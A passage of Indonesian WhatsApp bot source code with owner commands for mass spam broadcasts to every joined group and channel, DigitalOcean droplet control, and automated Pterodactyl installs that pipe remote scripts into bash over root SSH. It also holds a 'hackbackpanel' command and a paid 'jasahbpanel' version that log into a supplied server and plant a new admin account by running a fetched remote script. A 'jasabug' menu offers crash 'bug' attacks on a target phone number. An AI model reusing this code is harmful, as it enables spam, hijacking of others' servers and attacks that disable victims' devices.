            for (let i = 0; i < jumlah; i++) {
                const prosesPengiriman = global.channels.map(async (id) => {
                    try {
                        await dwiaff.sendMessage(id, { text: teks }, { quoted: msgQr });
                        totalBerhasil += 1;
                    } catch (error) {
                        console.error(`❌ Gagal mengirim ke ${id}:`, error);
                        totalGagal += 1;
                    }
                });

                // Tunggu semua pengiriman selesai di iterasi ini
                await Promise.all(prosesPengiriman);
                if (i < jumlah - 1) await sleep(jeda); // Tunggu jeda sebelum iterasi berikutnya
            }

            await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: `🎯 Pesan berhasil dikirim ke semua saluran. 🎉` }, { quoted: db.users[m.sender].deposit.msg });
            m.reply(`🚀 *Berhasil mengirim total ${totalBerhasil} pesan* ke semua saluran!`);
            delete db.users[m.sender].deposit;
        }
    }
}
break;

case "jpmchfoto": {
    if (!isCreator) return reply(mess.owner)
    if (!/image/.test(mime)) return m.reply(example("Balas/kirim foto beserta teksnya"));
    let image = await dwiaff.downloadAndSaveMediaMessage(qmsg);
    let caption = m.quoted ? m.quoted.text : text;
    let total = 0;

    global.channels = loadChannels();

    if (global.channels.length === 0) 
        return m.reply(`
╔══════════════════════════╗
        ❌ *SALAHAN* ❌
╚══════════════════════════╝
⚠️ Tidak ada saluran terdaftar untuk *JPM*!
Silakan daftarkan saluran terlebih dahulu.
`);

    m.reply(`
╭─❰ *PROCESSING MESSAGE* ❱─╮
📬 *Mengirim Pesan Ke*: 
  ➥ *${global.channels.length} Saluran*
⏳ *Mohon Tunggu...*
╰─────────────────────╯
    `);

    // Kirim pesan ke semua saluran
    for (let id of global.channels) {
        try {
            await dwiaff.sendMessage(
                id, 
                {
                    image: await fs.readFileSync(image), 
                    caption: caption, 
                    contextInfo: { forwardingScore: 1, isForwarded: true }
                }, 
                { quoted: qloc }
            );
            total += 1;
        } catch (e) {
            console.log(`⚠️ Gagal mengirim ke ${id}:`, e);
        }
        await sleep(global.delayjpmch);
    }

    await fs.unlinkSync(image);

    m.reply(`
╭─❰ *RESULT SUMMARY* ❱─╮
🎉 *Pesan Terkirim*: 
  ➥ *${total} Saluran*
✅ *Status*: Berhasil!
📩 Terima kasih telah menggunakan layanan ini.
╰─────────────────────╯
    `);
}
break;

case "jpmchvideo": {
    if (!isCreator) return reply(mess.owner)
    if (!/video/.test(mime)) return m.reply(example("Balas/kirim video beserta teksnya"));
    
    let video = await dwiaff.downloadAndSaveMediaMessage(qmsg);
    let caption = m.quoted ? m.quoted.text : text;
    let total = 0;

    global.channels = loadChannels();

    if (global.channels.length === 0) 
        return m.reply(`
╔══════════════════════════╗
        ❌ *SALAHAN* ❌
╚══════════════════════════╝
⚠️ Tidak ada saluran terdaftar untuk *JPM*!
Silakan daftarkan saluran terlebih dahulu.
`);

    m.reply(`
╭─❰ *PROCESSING MESSAGE* ❱─╮
📬 *Mengirim Pesan Ke*: 
  ➥ *${global.channels.length} Saluran*
⏳ *Mohon Tunggu...*
╰─────────────────────╯
    `);

    // Kirim pesan ke semua saluran
    for (let id of global.channels) {
        try {
            await dwiaff.sendMessage(
                id, 
                {
                    video: await fs.readFileSync(video), 
                    caption: caption, 
                    contextInfo: { forwardingScore: 1, isForwarded: true }
                }, 
                { quoted: qloc }
            );
            total += 1;
        } catch (e) {
            console.log(`⚠️ Gagal mengirim ke ${id}:`, e);
        }
        await sleep(global.delayjpmch);
    }

    await fs.unlinkSync(video);

    m.reply(`
╭─❰ *RESULT SUMMARY* ❱─╮
🎉 *Pesan Terkirim*: 
  ➥ *${total} Saluran*
✅ *Status*: Berhasil!
📩 Terima kasih telah menggunakan layanan ini.
╰─────────────────────╯
    `);
}
break;

case "jpmhidetag": {
    if (!isCreator) return reply(mess.owner)
    if (!text && !m.quoted) return m.reply(example("teksnya atau reply teks"));

    var teks = m.quoted ? m.quoted.text : text;
    let total = 0;
    let getGroups = await dwiaff.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let usergc = groups.map((v) => v.id);

    m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`);

    for (let jid of usergc) {
        try {
            // Ambil data member grup
            let groupMetadata = await dwiaff.groupMetadata(jid);
            let participants = groupMetadata.participants.map((p) => p.id);

            // Kirim pesan dengan mentions tanpa menampilkan daftar tag
            await dwiaff.sendMessage(jid, {
                text: teks,
                mentions: participants,
            }, { quoted: qloc });

            total += 1;
        } catch (error) {
            console.error(`Gagal mengirim pesan ke grup ${jid}:`, error);
        }
        await sleep(global.delayJpm);
    }

    m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`);
}
break;

case "jpm1": {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"))
let image = await dwiaff.downloadAndSaveMediaMessage(qmsg)
let total = 0
let getGroups = await dwiaff.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*`)
for (let jid of usergc) {
try {
dwiaff.sendMessage(jid, {image: await fs.readFileSync(image), caption: text, contextInfo: {forwardingScore: 1,
isForwarded: true}}, {quoted: qloc})
total += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(image)
m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break

case "jpm1": {
    if (!isCreator) return reply(mess.owner)
    if (!text) return m.reply(example("teksnya dengan balas/kirim foto"));
    if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"));
    
    let image = await dwiaff.downloadAndSaveMediaMessage(qmsg);
    let total = 0;
    
    // Ambil semua grup yang tergabung
    let getGroups = await dwiaff.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let usergc = groups.map((v) => v.id);
    m.reply(`Memproses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*`);
    
    // Button konfigurasi
    const button = [
        {
            buttonId: '.buypanel', // ID tombol yang akan memicu opsi
            buttonText: { displayText: 'Beli Panel' },
            buttonId: '.buyscript', // ID tombol yang akan memicu opsi
            buttonText: { displayText: 'Beli Script' },
            type: 1
        }
    ];
    
    // Kirim pesan ke setiap grup
    for (let jid of usergc) {
        try {
            // Kirim pesan dengan tombol
            await dwiaff.sendMessage(jid, {
                image: await fs.readFileSync(image), 
                caption: text,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true
                },
                buttons: button, // Tombol yang akan dikirim
                headerType: 4
            }, { quoted: qloc });
            total += 1;
        } catch (e) {
            console.log(`Gagal mengirim ke ${jid}:`, e);
        }
        await sleep(global.delayJpm);
    }

    await fs.unlinkSync(image);
    m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`);
}
break;

case "jpm2": {
    if (!isCreator) return reply(mess.owner)
    if (!text) return m.reply(example("teksnya dengan balas/kirim video"))
    if (!/video/.test(mime)) return m.reply(example("teksnya dengan balas/kirim video"))
    
    let video = await dwiaff.downloadAndSaveMediaMessage(qmsg)
    let total = 0
    let getGroups = await dwiaff.groupFetchAllParticipating()
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
    let usergc = groups.map((v) => v.id)
    
    m.reply(`Memproses Mengirim Pesan Teks & Video Ke *${usergc.length} Grup*`)
    
    for (let jid of usergc) {
        try {
            dwiaff.sendMessage(jid, {
                video: await fs.readFileSync(video),
                caption: text,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true
                }
            }, { quoted: qloc })
            total += 1
        } catch {}
        await sleep(global.delayJpm)
    }
    
    await fs.unlinkSync(video)
    m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break

case "jpmslide": {
if (!isCreator) return reply(mess.owner)
let allgrup = await dwiaff.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await dwiaff.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return reply(mess.owner)
let allgrup = await dwiaff.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await dwiaff.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

case 'listdroplet': {
    if (!isCreator) return reply(mess.owner)
    try {
        const getDroplets = async () => {
            try {
                const response = await fetch('https://api.digitalocean.com/v2/droplets', {
                    headers: {
                        Authorization: "Bearer " + global.apido
                    }
                });
                const data = await response.json();
                return data.droplets || [];
            } catch (err) {
                m.reply('Error fetching droplets: ' + err);
                return [];
            }
        };

        getDroplets().then(droplets => {
            let totalvps = droplets.length;
            let mesej = `List droplet DigitalOcean kamu: ${totalvps}\n\n`;

            if (droplets.length === 0) {
                mesej += 'Tidak ada droplet yang tersedia!';
            } else {
                droplets.forEach(droplet => {
                    const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
                    const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
                    
                    // Format tanggal pembuatan droplet
                    const createdAt = new Date(droplet.created_at).toLocaleString('id-ID', {
                        timeZone: 'Asia/Jakarta',
                        dateStyle: 'long',
                        timeStyle: 'short'
                    });

                    mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}
Tanggal Pembuatan: ${createdAt}\n\n`;
                });
            }
            dwiaff.sendMessage(m.chat, { text: mesej }, { quoted: m });
        });
    } catch (err) {
        m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
    }
}
break;

case 'restartvps': {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(`Example : *.${command}* iddroplet`)
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apido}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

case 'rebuild': {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(`Example : *.${command}* iddroplet`)
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apido}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apido}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
dwiaff.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

case "deldroplet": {
if (!isCreator) return reply(mess.owner) 
if (!text) return m.reply(`Example : *.${command}* iddroplet`)
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apido}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

case "sisadroplet": {
if (!isOwner) return m.reply(`Khusus Owner`)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apido}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apido}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isOwner) return m.reply(`Khusus Owner`)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

case "readqr": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply Qris"))
const Jimp = require("jimp");
const QrCode = require("qrcode-reader");
async function readQRISFromBuffer(buffer) {
    return new Promise(async (resolve, reject) => {
        try {
            const image = await Jimp.read(buffer);
            const qr = new QrCode();
            qr.callback = (err, value) => {
                if (err) return reject(err);
                resolve(value ? value.result : null);
            };
            qr.decode(image.bitmap);
        } catch (error) {
            return m.reply("error : " + error)
        }
    });
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await readQRISFromBuffer(aa)
await dwiaff.sendMessage(m.chat, {text: `${dd}`}, {quoted: m})
}
break

case "groupsearch": {
if (!q) return m.reply("Mau Nyari Group Apa?")
const anu = await axios.get(`https://api.athar.web.id/api/whatsapp/grup/search?query=${encodeURIComponent(q)}`)
m.reply("*[ HASIL SEARCHING ]*\n\n\n" + anu.data.result.slice(0, 10).map((g, i) => `- Group Name: ${i + 1}. ${g.title}\n- Group Link: ${g.link}\n`).join("\n") || "*[ 404 ]* Not Found")
}
break;

case "cekgempa": {
 m.reply("Sedang mengambil data gempa terkini...");
 
 try {
 const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
 const data = await response.json();
 
 if (!data || !data.Infogempa || !data.Infogempa.gempa) {
 return m.reply("Gagal mendapatkan data gempa dari BMKG.");
 }
 
 const gempa = data.Infogempa.gempa;
 
 let caption = `*📈 INFO GEMPA TERKINI*\n\n`;
 caption += `*Tanggal:* ${gempa.Tanggal}\n`;
 caption += `*Waktu:* ${gempa.Jam}\n`;
 caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
 caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
 caption += `*Lokasi:* ${gempa.Wilayah}\n`;
 caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
 caption += `*Potensi:* ${gempa.Potensi}\n`;
 caption += `*Dirasakan:* ${gempa.Dirasakan}\n\n`;
 caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;
 
 if (gempa.Shakemap) {
 const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
 await dwiaff.sendMessage(m.chat, {
 image: { url: shakemapUrl },
 caption: caption
 }, { quoted: m });
 } else {
 dwiaff.sendMessage(m.chat, { text: caption }, { quoted: m });
 }
 } catch (error) {
 console.log(error);
 m.reply("Terjadi kesalahan saat mengambil data gempa.");
 }
}
break

case "installpanel": {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await dwiaff.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

case "enc": case "encrypt": {
    if (!isCreator) return reply(mess.owner)
    if (!m.quoted) return m.reply(example("dengan reply file .js"))
    if (mime !== "application/javascript" && mime !== "text/javascript") return m.reply("Reply file .js")

    let media = await m.quoted.download()
    let filename = m.quoted.message.documentMessage.fileName
    let filePath = `./database/sampah/${filename}`

    try {
        await fs.writeFileSync(filePath, media)
        await m.reply("Memproses encrypt code . . .")

        let obfuscated = await JsConfuser.obfuscate(await fs.readFileSync(filePath, "utf8"), {
            target: "node",
            preset: "high",
            calculator: true,
            compact: true,
            hexadecimalNumbers: true,
            controlFlowFlattening: 0.75,
            deadCode: 0.2,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.75,
            flatten: true,
            globalConcealing: true,
            identifierGenerator: "randomized",
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            opaquePredicates: 0.75,
            renameVariables: true,
            renameGlobals: true,
            shuffle: { hash: 0.5, true: 0.5 },
            stringConcealing: true,
            stringCompression: true,
            stringEncoding: true,
            stringSplitting: 0.75,
            rgf: false
        })

        // Perbaikan: Gunakan obfuscated.code
        await fs.writeFileSync(filePath, obfuscated.code)

        await dwiaff.sendMessage(m.chat, {
            document: fs.readFileSync(filePath),
            mimetype: "application/javascript",
            fileName: filename,
            caption: "Encrypt file sukses ✅"
        }, { quoted: m })

    } catch (e) {
        m.reply("Error: " + e.message)
    } finally {
        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath)
        }
    }
}
break

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await dwiaff.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
        
case "ordernokos":

        {
          await handleOrderNokos(m, db, dwiaff, text);

        }
        break;        

case 'jasabug': {
    if (!q || isNaN(q)) return reply('Please Paste Nomor');

let text = q; // Store the input "enemy number" in the variable nomor
    let headerText = `
🩸⃟༑⌁⃰𝐍𝐚𝐛𝐳𝐱 𝐃𝐞͢𝐬𝐭𝐫𝐨𝐲 𝐁𝐮ͯ͢𝐭𝐭𝐨𝐧ཀ͜͡🦠️ 
🩸⃟༑⌁⃰𝐘𝐨𝐮 𝐬𝐞𝐧𝐭 𝐭𝐡𝐞 𝐛𝐮𝐠 𝐭𝐨 🦠️ ${text}
    `;
    dwiaff.sendMessage(m.chat, {
        image: { url: randomImage }, // Change this URL to your image link
        caption: headerText, 
        footer: "⿻  ⌜ 𝐍𝐚𝐛𝐙𝐱 ⌟  ⿻",
        buttons: [
            {
                buttonId: 'action',
                buttonText: {
                    displayText: '⟅̊༑ ▾ 𝐁𝐔𝐆 𝐍𝐀𝐁𝐙𝐗 ⿻'
                },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '⟅̊༑ ▾ 𝐁𝐔𝐆 𝐍𝐀𝐁𝐙𝐗 ⿻  ▾༑̴⟆̊‏‎‏⭑',
                        sections: [
                            { 
                                title: "⟅̊༑ ▾ 𝐁𝐔𝐆 𝐊𝐎𝐌𝐁𝐈𝐍𝐀𝐒𝐈 𝐅𝐔𝐍𝐂 ⿻",  
                                rows: [
                                    { title: "⟅̊༑ ▾ 𝐂𝐑𝐀𝐒𝐇𝐈𝐎𝐒 ⿻", id: `.jasabugios ${text}` },
                                    { title: "⟅̊༑ ▾ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐔𝐈⿻", id: `.jasabugui ${text}` },
                                    { title: "⟅̊༑ ▾ 𝐂𝐑𝐀𝐒𝐇 𝐅𝐎𝐑𝐂𝐄 𝐂𝐋𝐎𝐒𝐄 ⿻ ", id: `.jasabugfc ${text}` }, 
                                ]
                            }
                        ],
                    }),
                }
            }
        ],
        headerType: 4, // Header type 4 for image
        viewOnce: true
    }, { quoted: m });
}
break;

case "jasahbpanel": {
 if (m.isGroup) return reply(mess.group)

let t = text.split('|');
if (t.length < 2) return m.reply("Format salah! Gunakan: ipvps|pwvps");
let ipvps = t[0];
let passwd = t[1];

if (db.users[m.sender]?.status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

const UrlQr = global.qrisOrderKuota;

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

let amount = 5000 + generateRandomNumber(110, 250);
try {
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `

▧ INFORMASI PEMBAYARAN

• ID : ${get.data.result.transactionId} • Total Pembayaran : Rp${amount} • Barang : Hackback Panel • Expired : 5 menit

Note : QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan proses hackback panel.

Ketik .batalbeli untuk membatalkan transaksi. `;

let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender] = {
        status_deposit: true,
        saweria: {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: amount.toString()
        }
    };

    setTimeout(async () => {
        if (db.users[m.sender]?.status_deposit) {
            await dwiaff.sendMessage(m.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: msgQr });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
        }
    }, 300000);

    while (db.users[m.sender]?.status_deposit) {
        await new Promise(resolve => setTimeout(resolve, 8000));
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        if (resultcek.data.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const newuser = "admin" + generateRandomNumber(1000, 9999);
            const newpw = "admin" + generateRandomNumber(1000, 9999);

            const connSettings = {
                host: ipvps,
                port: '22',
                username: 'root',
                password: passwd
            };

            const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
            const ress = new Client();

            ress.on('ready', () => {
